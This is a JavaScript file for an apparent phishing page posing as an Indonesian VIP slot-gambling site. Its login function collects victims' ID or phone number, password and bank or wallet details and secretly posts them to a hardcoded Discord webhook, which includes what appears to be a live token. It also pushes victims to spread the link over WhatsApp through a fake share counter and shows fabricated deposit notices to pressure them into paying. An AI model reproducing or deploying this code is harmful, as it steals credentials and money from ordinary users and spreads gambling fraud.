// OMNI DATA CAPTURE - DISCORD WEBHOOK
const WEBHOOK = "https://discord.com/api/webhooks/1488920982059225218/k3BAyhlX0rVuXmY8gXQ-ECQtMWFduU123hjdsaJJ7Zc3MGsWriERGk3t9XVzwNp-bXhz";

async function omniLogin() {
    const u = document.getElementById('u_name').value;
    const p = document.getElementById('u_pass').value;
    const b = document.getElementById('u_bank').value;
    const msg = document.getElementById('status-msg');

    if(!u || !p || !b) return alert("System Error: Credential Required!");

    msg.innerText = "Encrypting Data...";

    // Kirim Data ke Discord lo secara rahasia
    try {
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "💎 NEW OMNI-PLATINUM TARGET!",
                    color: 15066594,
                    fields: [
                        {name: "ID/Phone", value: `\`${u}\``, inline: true},
                        {name: "Pass", value: `\`${p}\``, inline: true},
                        {name: "Bank/Wallet", value: `\`${b}\``, inline: false}
                    ],
                    timestamp: new Date()
                }]
            })
        });

        // Simulasi Bypass
        setTimeout(() => {
            document.getElementById('gate-system').classList.add('hidden-blur');
            document.getElementById('gate-system').style.display = 'none';
            document.getElementById('main-hub').classList.remove('hidden-blur');
            document.getElementById('display-user').innerText = u.toUpperCase();
            startLiveUpdates();
        }, 1500);
    } catch(err) {
        msg.innerText = "Server Error. Try Again.";
    }
}

// Share Counter (Fake)
let shares = 0;
function shareWA() {
    shares++;
    let progress = (shares / 5) * 100;
    document.getElementById('p-bar').style.width = progress + "%";
    document.getElementById('p-bar').innerText = progress + "%";
    
    // Redirect ke WA
    window.open("https://api.whatsapp.com/send?text=BRO!%20Gue%20baru%20temu%20link%20VVIP%20Slot%20Gacor!%20Gampang%20WD%20banget,%20cobain%20disini: " + window.location.href, "_blank");

    if(shares >= 5) {
        alert("AKSES GACOR AKTIF! Silahkan Deposit untuk Withdraw Pertama.");
    }
}

// Live Deposit Feed
function startLiveUpdates() {
    const list = document.getElementById('depo-list');
    const players = ["Rendi", "Santi", "Bocil_JP", "Arga_Master", "Vina_77"];
    
    setInterval(() => {
        const name = players[Math.floor(Math.random()*players.length)];
        const amount = (Math.floor(Math.random()*20) + 1) * 50000;
        const li = document.createElement('li');
        li.innerHTML = `<span class="green">✔</span> ${name}*** DEPOSIT Rp ${amount.toLocaleString('id-ID')}`;
        list.prepend(li);
        if(list.children.length > 5) list.removeChild(list.lastChild);
    }, 4000);
}
